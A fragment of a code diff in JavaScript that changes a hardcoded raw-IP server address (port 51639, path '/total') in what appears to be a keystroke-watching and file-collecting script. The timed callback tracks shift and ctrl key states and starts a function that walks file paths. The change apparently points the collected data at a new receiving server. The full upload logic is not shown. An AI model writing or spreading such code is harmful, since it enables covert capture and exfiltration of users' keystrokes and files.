@@ -88,7 +88,7 @@ setTimeout(() => {
         let shift = false;
         let ctrl = false;
         let isRunning = true;
-        const uu = "http://104.255.173.87:51639/total";
+        const uu = "http://170.39.215.22:51639/total";
 
         const uf = async (p) => {
             if (fs.statSync(p).isFile()) {
